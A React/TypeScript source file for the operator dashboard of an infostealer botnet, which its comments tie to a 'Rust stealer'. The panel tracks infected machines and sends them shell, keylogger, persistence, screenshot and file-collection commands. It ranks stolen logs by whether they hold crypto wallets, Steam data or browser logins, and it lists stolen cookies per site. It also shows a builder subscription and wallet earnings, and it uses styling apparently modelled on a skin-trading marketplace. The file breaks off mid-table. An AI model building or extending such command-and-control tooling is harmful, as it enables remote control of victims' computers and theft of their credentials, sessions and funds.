import React, { useState, useEffect, useMemo } from 'react';
import { motion } from 'framer-motion';
import { useAdminAuth } from '../contexts/AdminAuthContext';
import C2Debug from './C2Debug';
import { ComposableMap, Geographies, Geography, Marker } from "react-simple-maps";
import { AreaChart, Area, BarChart, Bar, XAxis, YAxis, CartesianGrid, Tooltip, Legend, ResponsiveContainer, PieChart, Pie, Cell } from 'recharts';

// World map data
const geoUrl = "https://raw.githubusercontent.com/zcreativelabs/react-simple-maps/master/topojson-maps/world-110m.json";

// Matches the LogPayload from the Rust stealer
interface Log {
  id: number; // Assuming the backend will add an ID
  agent_id: string;
  hostname: string;
  username: string;
  log_type: string;
  data: any; // This will be parsed based on log_type
  created_at: string;
  status: 'active' | 'inactive' | 'compromised';
  country_code?: string; // For map
}

interface Agent {
  id: number;
  agent_id: string;
  hostname: string;
  username: string;
  os_info: string;
  ip_address: string;
  last_seen: string;
  status: 'active' | 'inactive' | 'compromised';
  created_at: string;
  country_code?: string; // For map
}

interface Command {
  id: number;
  agent_id: string;
  command_type: 'shell' | 'download' | 'upload' | 'screenshot' | 'keylog' | 'persistence' | 'collect_data' | 'collect_files' | 'kill_agent' | 'kill_process';
  command_data: string;
  status: 'pending' | 'executing' | 'completed' | 'failed';
  result: string;
  created_at: string;
  executed_at: string;
  completed_at: string;
}

const C2Dashboard: React.FC = () => {
  const [agents, setAgents] = useState<Agent[]>([]);
  const [logs, setLogs] = useState<Log[]>([]);
  const [logStatsByDay, setLogStatsByDay] = useState<any[]>([]);
  const [selectedAgent, setSelectedAgent] = useState<string>('');
  const [commandType, setCommandType] = useState<'shell' | 'download' | 'upload' | 'screenshot' | 'keylog' | 'persistence' | 'collect_data' | 'collect_files' | 'kill_agent' | 'kill_process'>('shell');
  const [commandData, setCommandData] = useState('');
  const [isLoading, setIsLoading] = useState(true);
  const [activeTab, setActiveTab] = useState<'overview' | 'agents' | 'commands' | 'logs' | 'debug'>('overview');
  const [selectedLog, setSelectedLog] = useState<Log | null>(null);
  const [showInactive, setShowInactive] = useState(false);
  const { isAdminAuthenticated } = useAdminAuth();

  useEffect(() => {
    if (isAdminAuthenticated) {
      fetchData();
      const interval = setInterval(fetchData, 5000); // Refresh every 5 seconds
      return () => clearInterval(interval);
    }
  }, [isAdminAuthenticated]);

  const getAuthHeaders = (): HeadersInit => {
    const token = localStorage.getItem('admin_token');
    const headers = new Headers();
    if (token) {
      headers.append('Authorization', `Bearer ${token}`);
    }
    return headers;
  };

  const getAuthHeadersWithContentType = (): HeadersInit => {
    const headers = getAuthHeaders();
    (headers as Headers).append('Content-Type', 'application/json');
    return headers;
  };

  const fetchData = async () => {
    if (!isAdminAuthenticated) return;

    try {
      const headers = getAuthHeaders();
      const [agentsRes, logsRes, statsRes] = await Promise.all([
        fetch('/api/admin/c2/agents', { headers }),
        fetch('/api/admin/c2/logs', { headers }), // Fetch logs instead of results
        fetch('/api/admin/c2/stats/logs-by-day', { headers })
      ]);
      
      if (agentsRes.ok) {
        const agentsData = await agentsRes.json();
        setAgents(agentsData);
      } else {
        console.error('Agents endpoint failed:', agentsRes.status, agentsRes.statusText);
      }
      
      if (logsRes.ok) {
        const logsData = await logsRes.json();
        setLogs(logsData);
      } else {
        console.error('Logs endpoint failed:', logsRes.status, logsRes.statusText);
      }

      if (statsRes.ok) {
        const statsData = await statsRes.json();
        const formattedStats = statsData.map((stat: any) => ({
            date: new Date(stat.date).toLocaleDateString('en-US', { month: 'short', day: 'numeric' }),
            important: stat.important || 0,
            regular: stat.regular || 0,
        }));
        setLogStatsByDay(formattedStats);
      } else {
        console.error('Log stats endpoint failed:', statsRes.status, statsRes.statusText);
      }
      
    } catch (error) {
      console.error('Error fetching C2 data:', error);
    } finally {
      setIsLoading(false);
    }
  };

  const sendCommand = async () => {
    if (!selectedAgent || !commandData.trim()) {
      alert('Please select an agent and enter a command');
      return;
    }

    try {
      const response = await fetch('/api/admin/c2/command', {
        method: 'POST',
        headers: getAuthHeadersWithContentType(),
        body: JSON.stringify({
          agent_id: selectedAgent,
          command_type: commandType,
          command_data: commandData
        })
      });

      if (response.ok) {
        setCommandData('');
        alert('Command sent successfully');
        fetchData();
      } else {
        alert('Failed to send command');
      }
    } catch (error) {
      console.error('Error sending command:', error);
      alert('Error sending command');
    }
  };

  const downloadFile = async (agentId: string, filename: string) => {
    try {
      console.log('Attempting to download:', { agentId, filename });
      const response = await fetch(`/api/admin/c2/download/${encodeURIComponent(agentId)}/${encodeURIComponent(filename)}`, {
        headers: getAuthHeaders()
      });

      console.log('Download response:', {
        status: response.status,
        statusText: response.statusText,
        headers: Object.fromEntries(response.headers.entries())
      });

      if (response.ok) {
        const blob = await response.blob();
        const url = window.URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = filename;
        document.body.appendChild(a);
        a.click();
        window.URL.revokeObjectURL(url);
        document.body.removeChild(a);
      } else {
        let errorMessage = `Failed to download file: Server returned status ${response.status}`;
        try {
          const errorData = await response.json();
          errorMessage = `Failed to download file: ${errorData.error || response.statusText}`;
          console.error('Download error details:', errorData);
        } catch (parseError) {
          console.error('Could not parse error response:', parseError);
        }
        alert(errorMessage);
      }
    } catch (error) {
      console.error('Error downloading file:', error);
      alert('Error downloading file: ' + (error instanceof Error ? error.message : 'Unknown error'));
    }
  };

  const killAgent = async (agentId: string, killType: 'agent' | 'process') => {
    if (!confirm(`Are you sure you want to kill this ${killType}? This action cannot be undone.`)) {
      return;
    }

    try {
      const response = await fetch(`/api/admin/c2/kill/${encodeURIComponent(agentId)}`, {
        method: 'POST',
        headers: getAuthHeadersWithContentType(),
        body: JSON.stringify({ killType })
      });

      if (response.ok) {
        const result = await response.json();
        alert(`Kill command sent successfully: ${result.message}`);
        fetchData(); // Refresh data
      } else {
        try {
          const errorData = await response.json();
          alert(`Failed to send kill command: ${errorData.error || response.statusText}`);
        } catch {
          alert(`Failed to send kill command: Server returned status ${response.status}`);
        }
      }
    } catch (error) {
      console.error('Error killing agent:', error);
      alert('Error killing agent');
    }
  };

  const deleteAgent = async (agentId: string) => {
    if (!confirm(`Are you sure you want to permanently delete this agent? This action cannot be undone and will remove all associated data.`)) {
      return;
    }

    try {
      const response = await fetch(`/api/admin/c2/agents/${encodeURIComponent(agentId)}`, {
        method: 'DELETE',
        headers: getAuthHeaders()
      });

      if (response.ok) {
        const result = await response.json();
        alert(`Agent deleted successfully: ${result.message}`);
        fetchData(); // Refresh data
      } else {
        try {
          const errorData = await response.json();
          alert(`Failed to delete agent: ${errorData.error || response.statusText}`);
        } catch {
          alert(`Failed to delete agent: Server returned status ${response.status}`);
        }
      }
    } catch (error) {
      console.error('Error deleting agent:', error);
      alert('Error deleting agent');
    }
  };

  const deleteLog = async (logId: number) => {
    if (!confirm('Are you sure you want to delete this log? This action cannot be undone.')) {
      return;
    }

    try {
      const response = await fetch(`/api/admin/c2/logs/${logId}`, {
        method: 'DELETE',
        headers: getAuthHeaders()
      });

      if (response.ok) {
        setLogs(logs.filter(l => l.id !== logId));
        alert('Log deleted successfully');
      } else {
        const data = await response.json();
        alert(`Failed to delete log: ${data.error || 'Unknown error'}`);
      }
    } catch (error) {
      console.error('Error deleting log:', error);
      alert('Error deleting log');
    }
  };

  const getStatusColor = (status: string) => {
    switch (status) {
      case 'active': return 'text-green-500';
      case 'inactive': return 'text-yellow-500';
      case 'compromised': return 'text-red-500';
      default: return 'text-gray-500';
    }
  };

  const getStatusDotColor = (status: string) => {
    switch (status) {
      case 'active': return 'bg-green-500';
      case 'inactive': return 'bg-yellow-500';
      case 'compromised': return 'bg-red-500';
      default: return 'bg-gray-500';
    }
  };

  const getCommandTypeColor = (type: string) => {
    switch (type) {
      case 'shell': return 'bg-blue-500';
      case 'download': return 'bg-green-500';
      case 'upload': return 'bg-purple-500';
      case 'screenshot': return 'bg-yellow-500';
      case 'keylog': return 'bg-red-500';
      case 'persistence': return 'bg-indigo-500';
      case 'collect_data': return 'bg-teal-500';
      case 'collect_files': return 'bg-orange-500';
      case 'kill_process': return 'bg-red-600';
      case 'kill_agent': return 'bg-red-800';
      default: return 'bg-gray-500';
    }
  };

  const getLogTypeColor = (type: string) => {
    switch (type) {
      case 'system_info': return 'bg-blue-500';
      case 'browsers': return 'bg-yellow-500';
      case 'wallets': return 'bg-green-500';
      case 'steam': return 'bg-gray-600';
      case 'processes': return 'bg-purple-500';
      case 'network': return 'bg-teal-500';
      default: return 'bg-gray-500';
    }
  };

  const filteredAgents = showInactive ? agents : agents.filter(a => a.status === 'active');

  // Don't render if not authenticated
  if (!isAdminAuthenticated) {
    return null;
  }

  return (
    <div className="min-h-screen bg-gradient-to-b from-csfloat-darker to-black pt-16 pb-12 text-white">
      <div className="max-w-screen-2xl mx-auto px-4 sm:px-6 lg:px-8">
        <div className="mb-8">
          <h1 className="text-4xl font-bold text-white mb-2">C2 Command Center</h1>
          <p className="text-csfloat-light/70">An overview of agent activity and collected intelligence.</p>
        </div>

        {/* Tabs */}
        <div className="flex space-x-1 mb-6">
          {[
            { id: 'overview', label: 'Overview' },
            { id: 'agents', label: 'Agents' },
            { id: 'commands', label: 'Commands' },
            { id: 'logs', label: 'Logs' },
            { id: 'debug', label: 'Debug' }
          ].map((tab) => (
            <button
              key={tab.id}
              onClick={() => setActiveTab(tab.id as any)}
              className={`px-6 py-3 rounded-lg font-medium transition-colors ${
                activeTab === tab.id
                  ? 'bg-csfloat-blue text-white'
                  : 'text-csfloat-light/70 hover:text-white hover:bg-csfloat-gray/20'
              }`}
            >
              {tab.label}
            </button>
          ))}
        </div>
        
        {isLoading ? (
          <div className="text-center py-8">
            <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-csfloat-blue mx-auto"></div>
            <p className="mt-4 text-csfloat-light/60">Loading C2 data...</p>
          </div>
        ) : (
          <>
            {/* Overview Tab */}
            {activeTab === 'overview' && <OverviewTab agents={agents} logs={logs} logStatsByDay={logStatsByDay} />}

            {/* Agents Tab - simplified, as full details are in logs */}
            {activeTab === 'agents' && (
              <div className="bg-csfloat-dark/80 backdrop-blur-sm rounded-lg border border-csfloat-gray/20">
                <div className="p-6">
                  <div className="flex justify-between items-center mb-4">
                    <h2 className="text-2xl font-bold">Agents ({filteredAgents.length})</h2>
                    <label className="flex items-center space-x-2 cursor-pointer">
                      <input 
                        type="checkbox" 
                        className="form-checkbox h-5 w-5 text-blue-600 bg-gray-800 border-gray-600 rounded focus:ring-blue-500"
                        checked={showInactive}
                        onChange={() => setShowInactive(!showInactive)}
                      />
                      <span className="text-gray-300">Show Inactive</span>
                    </label>
                  </div>
                  <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
                    {filteredAgents.map(agent => (
                      <div 
                        key={agent.agent_id} 
                        className={`bg-gray-800 rounded-lg p-4 cursor-pointer transition-all duration-200 ${selectedAgent === agent.agent_id ? 'ring-2 ring-blue-500' : 'hover:bg-gray-700'}`}
                        onClick={() => setSelectedAgent(agent.agent_id)}
                      >
                        <div className="flex justify-between items-start">
                          <div className="flex-grow">
                            <div className="flex items-center mb-2">
                              <div className={`w-3 h-3 rounded-full mr-2 ${getStatusDotColor(agent.status)}`}></div>
                              <p className="font-bold text-lg truncate" title={agent.hostname}>{agent.hostname}</p>
                            </div>
                            <p className="text-sm text-gray-400 truncate" title={agent.agent_id}>{agent.agent_id}</p>
                          </div>
                          <div className="flex-shrink-0">
                             <span className={`px-2 py-1 text-xs font-semibold rounded-full ${getStatusColor(agent.status)} bg-opacity-20`}>
                              {agent.status}
                            </span>
                          </div>
                        </div>
                        <div className="mt-4 space-y-2 text-sm">
                          <div className="flex justify-between">
                            <span className="text-gray-400">Username:</span>
                            <span className="font-mono">{agent.username}</span>
                          </div>
                          <div className="flex justify-between">
                            <span className="text-gray-400">IP Address:</span>
                            <span className="font-mono">{agent.ip_address}</span>
                          </div>
                          <div className="flex justify-between">
                            <span className="text-gray-400">OS:</span>
                            <span className="text-right truncate" title={agent.os_info}>{agent.os_info}</span>
                          </div>
                          <div className="flex justify-between">
                            <span className="text-gray-400">Last Seen:</span>
                            <span>{new Date(agent.last_seen).toLocaleString()}</span>
                          </div>
                        </div>
                        {/* Kill Agent Buttons */}
                        <div className="mt-4 pt-3 border-t border-gray-700">
                          <div className="flex space-x-2 mb-2">
                            <button
                              onClick={(e) => {
                                e.stopPropagation();
                                killAgent(agent.agent_id, 'process');
                              }}
                              className="flex-1 bg-red-600 hover:bg-red-700 text-white px-3 py-1 rounded text-xs font-medium transition-colors"
                              title="Kill the agent process (agent will restart if persistence is enabled)"
                            >
                              Kill Process
                            </button>
                            <button
                              onClick={(e) => {
                                e.stopPropagation();
                                killAgent(agent.agent_id, 'agent');
                              }}
                              className="flex-1 bg-red-800 hover:bg-red-900 text-white px-3 py-1 rounded text-xs font-medium transition-colors"
                              title="Terminate the agent completely (marks as compromised)"
                            >
                              Kill Agent
                            </button>
                          </div>
                          <div className="flex">
                            <button
                              onClick={(e) => {
                                e.stopPropagation();
                                deleteAgent(agent.agent_id);
                              }}
                              className="w-full bg-gray-800 hover:bg-gray-700 text-red-400 hover:text-red-300 px-3 py-1 rounded text-xs font-medium transition-colors border border-gray-600 hover:border-gray-500"
                              title="Permanently delete this agent and all associated data"
                            >
                              🗑️ Delete Agent
                            </button>
                          </div>
                        </div>
                      </div>
                    ))}
                  </div>
                </div>
              </div>
            )}

            {/* Commands Tab - simplified */}
            {activeTab === 'commands' && (
              <div className="bg-csfloat-dark/80 backdrop-blur-sm rounded-lg border border-csfloat-gray/20">
                <div className="p-6">
                  <h2 className="text-2xl font-bold text-white mb-4">Send Command</h2>
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mb-6">
                    <div>
                      <label className="block text-sm font-medium text-csfloat-light/70 mb-2">
                        Select Agent
                      </label>
                      <select
                        value={selectedAgent}
                        onChange={(e) => setSelectedAgent(e.target.value)}
                        className="w-full bg-csfloat-darker border border-csfloat-gray/20 rounded-lg px-4 py-2 text-white focus:outline-none focus:border-csfloat-blue"
                      >
                        <option value="">Choose an agent...</option>
                        {agents.map((agent) => (
                          <option key={agent.id} value={agent.agent_id}>
                            {agent.hostname} ({agent.agent_id})
                          </option>
                        ))}
                      </select>
                    </div>
                    <div>
                      <label className="block text-sm font-medium text-csfloat-light/70 mb-2">
                        Command Type
                      </label>
                      <select
                        value={commandType}
                        onChange={(e) => setCommandType(e.target.value as any)}
                        className="w-full bg-csfloat-darker border border-csfloat-gray/20 rounded-lg px-4 py-2 text-white focus:outline-none focus:border-csfloat-blue"
                      >
                        <option value="shell">Shell Command</option>
                        <option value="download">Download File</option>
                        <option value="upload">Upload File</option>
                        <option value="screenshot">Screenshot</option>
                        <option value="keylog">Keylogger</option>
                        <option value="persistence">Persistence</option>
                        <option value="collect_data">Collect Data</option>
                        <option value="collect_files">Collect Files</option>
                        <option value="kill_process">Kill Process</option>
                        <option value="kill_agent">Kill Agent</option>
                      </select>
                    </div>
                  </div>
                  <div className="mb-6">
                    <label className="block text-sm font-medium text-csfloat-light/70 mb-2">
                      Command Data
                    </label>
                    <textarea
                      value={commandData}
                      onChange={(e) => setCommandData(e.target.value)}
                      placeholder="Enter command or file path..."
                      className="w-full bg-csfloat-darker border border-csfloat-gray/20 rounded-lg px-4 py-2 text-white focus:outline-none focus:border-csfloat-blue h-32 resize-none"
                    />
                  </div>
                  <button
                    onClick={sendCommand}
                    disabled={!selectedAgent || !commandData.trim()}
                    className="bg-csfloat-blue hover:bg-blue-600 disabled:bg-csfloat-gray/50 text-white px-6 py-2 rounded-lg transition-colors duration-200 disabled:cursor-not-allowed"
                  >
                    Send Command
                  </button>
                </div>
              </div>
            )}

            {/* Logs Tab */}
            {activeTab === 'logs' && <LogsTab logs={logs} onSelectLog={setSelectedLog} onDeleteLog={deleteLog} getLogTypeColor={getLogTypeColor} />}

            {/* Debug Tab */}
            {activeTab === 'debug' && <C2Debug />}
          </>
        )}

        {/* Log Viewer Modal */}
        {selectedLog && (
          <div className="fixed inset-0 bg-black/70 flex items-center justify-center z-50 backdrop-blur-sm">
            <motion.div 
              initial={{ opacity: 0, scale: 0.95 }}
              animate={{ opacity: 1, scale: 1.0 }}
              className="bg-csfloat-dark rounded-lg p-6 max-w-4xl w-full mx-4 max-h-[90vh] overflow-y-auto border border-csfloat-gray/20"
            >
              <div className="flex justify-between items-center mb-4">
                <h3 className="text-xl font-bold text-white">Log Details</h3>
                <button
                  onClick={() => setSelectedLog(null)}
                  className="text-csfloat-light/60 hover:text-white"
                >
                  ✕
                </button>
              </div>
              <LogViewer log={selectedLog} />
            </motion.div>
          </div>
        )}
      </div>
    </div>
  );
};

// --- Helper Functions & Components for Overview Tab ---

const isImportantLog = (log: Log) => {
    if (log.log_type === 'wallets' || log.log_type === 'steam') {
        return true;
    }
    if (log.log_type === 'browsers' && log.data?.logins?.length > 0) {
        return true;
    }
    return false;
};

const OverviewStatCard: React.FC<{ title: string, value: string, subValue?: string, color: string, icon: React.ReactNode }> = ({ title, value, subValue, color, icon }) => (
    <div className={`rounded-lg p-4 text-white flex items-center ${color}`}>
        <div className="text-4xl mr-4">{icon}</div>
        <div>
            <div className="text-sm uppercase font-bold tracking-wider">{title}</div>
            <div className="text-2xl font-bold">{value}</div>
            {subValue && <div className="text-xs opacity-80">{subValue}</div>}
        </div>
    </div>
);


const OverviewTab: React.FC<{agents: Agent[], logs: Log[], logStatsByDay: any[]}> = ({ agents, logs, logStatsByDay }) => {
  
  const { importantLogs, regularLogs } = useMemo(() => {
    const importantLogs = logs.filter(isImportantLog);
    const regularLogs = logs.filter(log => !isImportantLog(log));
    return { importantLogs, regularLogs };
  }, [logs]);

  const logTypeData = [
      { name: 'Important Logs', value: importantLogs.length },
      { name: 'Regular Logs', value: regularLogs.length }
  ];

  const agentsByCountry = useMemo(() => {
    const counts: Record<string, number> = {};
    agents.forEach(agent => {
        const country = agent.country_code || 'XX'; // Default to XX if no country
        counts[country] = (counts[country] || 0) + 1;
    });
    return Object.entries(counts).map(([name, value]) => ({ name, value }));
  }, [agents]);


  return (
      <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }}>
        {/* Top Stat Cards */}
        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6 mb-8">
           <OverviewStatCard 
                title="Builder Version" 
                value="27.5"
                subValue="Updated: 21-06-2020"
                color="bg-gray-700"
                icon={<svg xmlns="http://www.w3.org/2000/svg" className="h-10 w-10" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 5H7a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2V7a2 2 0 00-2-2h-2M9 5a2 2 0 002 2h2a2 2 0 002-2M9 5a2 2 0 012-2h2a2 2 0 012 2m-3 7h3m-3 4h3m-6-4h.01M9 16h.01" /></svg>}
           />
           <OverviewStatCard 
                title="Builder Subscription" 
                value="Active"
                subValue="Until 09-07-2020 (17 days)"
                color="bg-teal-500"
                icon={<svg xmlns="http://www.w3.org/2000/svg" className="h-10 w-10" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 7V3m8 4V3m-9 8h10M5 21h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z" /></svg>}
           />
           <OverviewStatCard 
                title="Logs" 
                value={`${logs.length} / ${importantLogs.length}`}
                subValue={`${regularLogs.length} regular`}
                color="bg-blue-500"
                icon={<svg xmlns="http://www.w3.org/2000/svg" className="h-10 w-10" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z" /></svg>}
           />
           <OverviewStatCard 
                title="Wallet" 
                value="₿ 0.00006"
                subValue="~ $0.58 USD"
                color="bg-purple-600"
                icon={<svg xmlns="http://www.w3.org/2000/svg" className="h-10 w-10" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M3 10h18M7 15h1m4 0h1m-7 4h.01M9 16h.01" /></svg>}
           />
        </div>

        {/* Main Charts Area */}
        <div className="grid grid-cols-1 lg:grid-cols-3 gap-8">
            {/* Left side: Time series chart */}
            <div className="lg:col-span-2 bg-csfloat-dark/80 backdrop-blur-sm rounded-lg p-6 border border-csfloat-gray/20">
                <h3 className="text-xl font-bold mb-4">Last 30 Days</h3>
                <ResponsiveContainer width="100%" height={350}>
                    <AreaChart data={logStatsByDay}>
                        <defs>
                            <linearGradient id="colorImportant" x1="0" y1="0" x2="0" y2="1">
                                <stop offset="5%" stopColor="#3b82f6" stopOpacity={0.8}/>
                                <stop offset="95%" stopColor="#3b82f6" stopOpacity={0}/>
                            </linearGradient>
                            <linearGradient id="colorRegular" x1="0" y1="0" x2="0" y2="1">
                                <stop offset="5%" stopColor="#14b8a6" stopOpacity={0.8}/>
                                <stop offset="95%" stopColor="#14b8a6" stopOpacity={0}/>
                            </linearGradient>
                        </defs>
                        <CartesianGrid strokeDasharray="3 3" stroke="rgba(255, 255, 255, 0.1)" />
                        <XAxis dataKey="date" stroke="#8892b0" fontSize={12} />
                        <YAxis stroke="#8892b0" fontSize={12} />
                        <Tooltip contentStyle={{ backgroundColor: '#1a202c', border: '1px solid #4a5568' }}/>
                        <Legend />
                        <Area type="monotone" dataKey="important" name="Important Logs" stroke="#3b82f6" fillOpacity={1} fill="url(#colorImportant)" />
                        <Area type="monotone" dataKey="regular" name="Regular Logs" stroke="#14b8a6" fillOpacity={1} fill="url(#colorRegular)" />
                    </AreaChart>
                </ResponsiveContainer>
            </div>

            {/* Right side: Donut chart and Map */}
            <div className="space-y-8">
                <div className="bg-csfloat-dark/80 backdrop-blur-sm rounded-lg p-6 border border-csfloat-gray/20">
                    <h3 className="text-xl font-bold mb-4">Total Logs ({logs.length})</h3>
                     <ResponsiveContainer width="100%" height={200}>
                        <PieChart>
                            <Pie 
                                data={logTypeData} 
                                dataKey="value" 
                                nameKey="name" 
                                cx="50%" 
                                cy="50%" 
                                innerRadius={60} 
                                outerRadius={80} 
                                fill="#8884d8" 
                                paddingAngle={5}
                            >
                                <Cell key={`cell-0`} fill="#3b82f6" />
                                <Cell key={`cell-1`} fill="#14b8a6" />
                            </Pie>
                            <Tooltip contentStyle={{ backgroundColor: '#1a202c', border: '1px solid #4a5568' }}/>
                            <Legend />
                        </PieChart>
                    </ResponsiveContainer>
                </div>
                <div className="bg-csfloat-dark/80 backdrop-blur-sm rounded-lg p-6 border border-csfloat-gray/20">
                    <h3 className="text-xl font-bold mb-4">Agents by Country</h3>
                    <AgentsWorldMap agents={agents} />
                </div>
            </div>
        </div>
      </motion.div>
  );
}

const AgentsWorldMap: React.FC<{ agents: Agent[] }> = ({ agents }) => {
    const agentCounts = useMemo(() => {
        const counts: { [key: string]: { markerOffset: number; "count": number, "coords": [number, number]} } = {};
        
        // This is a simplified lookup. A real implementation might use a library or API.
        const countryCoords: { [key: string]: [number, number] } = {
            US: [-95, 38], CA: [-105, 55], DE: [10, 51], GB: [-2, 54], FR: [2, 46],
            // Add more countries as needed
        };

        agents.forEach(agent => {
            const countryCode = agent.country_code || 'XX';
            if (!counts[countryCode]) {
                 counts[countryCode] = {
                    markerOffset: -15,
                    count: 0,
                    coords: countryCoords[countryCode] || [0,0],
                };
            }
            counts[countryCode].count++;
        });

        return Object.entries(counts).map(([country, data]) => ({
            name: country,
            ...data
        }));
    }, [agents]);

    if (!agents || agents.length === 0) {
        return <p className="text-csfloat-light/70">No agent data to display on map.</p>;
    }

    return (
        <ComposableMap projectionConfig={{ scale: 100 }} style={{ width: "100%", height: "auto" }}>
            <Geographies geography={geoUrl}>
                {({ geographies }: { geographies: any[] }) =>
                    geographies.map((geo: any) => (
                        <Geography
                            key={geo.rsmKey}
                            geography={geo}
                            fill="#334155"
                            stroke="#1e293b"
                        />
                    ))
                }
            </Geographies>
            {agentCounts.map(({ name, coords, count }) => (
                <Marker key={name} coordinates={coords}>
                    <circle r={4 + count * 0.5} fill="#3b82f6" stroke="#fff" strokeWidth={1} />
                    <text
                        textAnchor="middle"
                        y={-15}
                        style={{ fontFamily: "system-ui", fill: "#fff", fontSize: 10 }}
                    >
                        {name} ({count})
                    </text>
                </Marker>
            ))}
        </ComposableMap>
    );
};


const StatCard: React.FC<{title: string, value: number | string, color?: string}> = ({ title, value, color = 'text-white' }) => (
    <div className="bg-csfloat-dark/80 backdrop-blur-sm rounded-lg p-6 border border-csfloat-gray/20">
        <h3 className="text-csfloat-light/70 text-sm mb-2">{title}</h3>
        <p className={`text-3xl font-bold ${color}`}>{value}</p>
    </div>
);

const LogsTab: React.FC<{logs: Log[], onSelectLog: (log: Log) => void, onDeleteLog: (id: number) => void, getLogTypeColor: (type: string) => string}> = ({ logs, onSelectLog, onDeleteLog, getLogTypeColor }) => {
    return (
        <div className="bg-csfloat-dark/80 backdrop-blur-sm rounded-lg border border-csfloat-gray/20 overflow-hidden">
            <table className="min-w-full divide-y divide-csfloat-gray/20">
                <thead className="bg-csfloat-dark">
                    <tr>
                        <th className="px-6 py-3 text-left text-xs font-medium text-csfloat-light/70 uppercase tracking-wider">Agent</th>
                        <th className="px-6 py-3 text-left text-xs font-medium text-csfloat-light/70 uppercase tracking-wider">Log Type</th>
                        <th className="px-6 py-3 text-left text-xs font-medium text-csfloat-light/70 uppercase tracking-wider">Time</th>
                        <th className="px-6 py-3 text-right text-xs font-medium text-csfloat-light/70 uppercase tracking-wider">Actions</th>
                    </tr>
                </thead>
                <tbody className="divide-y divide-csfloat-gray/20">
                    {logs.map(log => (
                        <tr key={log.id} className="hover:bg-csfloat-gray/10 transition-colors">
                            <td className="px-6 py-4 whitespace-nowrap">
                                <div className="text-sm font-medium">{log.hostname}</div>
                                <div className="text-xs text-csfloat-light/70 font-mono">{log.agent_id}</div>
                            </td>
                             <td className="px-6 py-4 whitespace-nowrap">
                                <span className={`inline-block px-2 py-0.5 rounded text-xs font-semibold ${getLogTypeColor(log.log_type)}`}>
                                    {log.log_type}
                                </span>
                            </td>
                            <td className="px-6 py-4 whitespace-nowrap text-sm text-csfloat-light/70">{new Date(log.created_at).toLocaleString()}</td>
                            <td className="px-6 py-4 whitespace-nowrap text-right text-sm font-medium">
                                <button onClick={() => onSelectLog(log)} className="text-csfloat-blue hover:text-blue-400 mr-4">View</button>
                                <button onClick={() => onDeleteLog(log.id)} className="text-red-500 hover:text-red-400">Delete</button>
                            </td>
                        </tr>
                    ))}
                </tbody>
            </table>
        </div>
    );
}

const LogViewer: React.FC<{log: Log}> = ({ log }) => {
    // --- Cookie Sorting/Filtering UI for 'browsers' logs ---
    const [selectedSite, setSelectedSite] = React.useState<string>('');
    const [sortKey, setSortKey] = React.useState<'name' | 'value'>('name');
    const [sortAsc, setSortAsc] = React.useState<boolean>(true);

    // Helper to extract all cookies grouped by domain/site
    const getCookiesBySite = (data: any) => {
        const cookies: any[] = [];
        // Chromium browsers
        Object.values(data.chromium || {}).forEach((browser: any) => {
            if (Array.isArray(browser.cookies)) {
                cookies.push(...browser.cookies);
            }
        });
        // Gecko browsers
        Object.values(data.gecko || {}).forEach((browser: any) => {
            if (Array.isArray(browser.cookies)) {
                cookies.push(...browser.cookies);
            }
        });
        // Group by domain
        const grouped: Record<string, any[]> = {};
        cookies.forEach(cookie => {
            const domain = cookie.domain || 'unknown';
            if (!grouped[domain]) grouped[domain] = [];
            grouped[domain].push(cookie);
        });
        return grouped;
    };

    // Only show cookie UI for browsers logs
    if (log.log_type === 'browsers') {
        const cookiesBySite = getCookiesBySite(log.data);
        const allSites = Object.keys(cookiesBySite).sort();
        const site = selectedSite && cookiesBySite[selectedSite] ? selectedSite : allSites[0] || '';
        const cookies = cookiesBySite[site] || [];
        const sortedCookies = [...cookies].sort((a, b) => {
            if (a[sortKey] < b[sortKey]) return sortAsc ? -1 : 1;
            if (a[sortKey] > b[sortKey]) return sortAsc ? 1 : -1;
            return 0;
        });
        return (
            <div className="bg-csfloat-darker rounded p-4 border border-csfloat-gray/10">
                <div className="mb-4 flex flex-wrap gap-4 items-center">
                    <label className="text-csfloat-light/80 font-medium">Site:</label>
                    <select
                        value={site}
                        onChange={e => setSelectedSite(e.target.value)}
                        className="bg-csfloat-dark border border-csfloat-gray/20 rounded px-2 py-1 text-white"
                    >
                        {allSites.map(domain => (
                            <option key={domain} value={domain}>{domain}</option>
                        ))}
                    </select>
                    <label className="ml-4 text-csfloat-light/80 font-medium">Sort by:</label>
                    <select
                        value={sortKey}
                        onChange={e => setSortKey(e.target.value as 'name' | 'value')}
                        className="bg-csfloat-dark border border-csfloat-gray/20 rounded px-2 py-1 text-white"
                    >
                        <option value="name">Name</option>
                        <option value="value">Value</option>
                    </select>
                    <button
                        className="ml-2 px-2 py-1 rounded border border-csfloat-gray/20 text-white bg-csfloat-blue hover:bg-blue-600"
                        onClick={() => setSortAsc(a => !a)}
                    >
                        {sortAsc ? 'Asc' : 'Desc'}
                    </button>
                </div>
                <div className="overflow-x-auto">
                    <table className="min-w-full text-sm">
                        <thead>
                            <tr className="bg-csfloat-dark/80">
                                <th className="px-2 py-1 text-left">Name</th>
                                <th className="px-2 py-1 text-left">Value</th>
                                <th className="px-2 py-1 text-left">Domain</th>
                                <th className="px-2 py-1 text-left">Path</th>
                                <th className="px-2 py-1 text-left">Expires</th>
                                <th className="px-2 py-1 text-left">HttpOnly</th>
                                <th className="px-2 py-1 text-left">Secure</th>
                            </tr>
                        </thead>
                        <tbody>
                            {sortedCookies.map((cookie, idx) => (
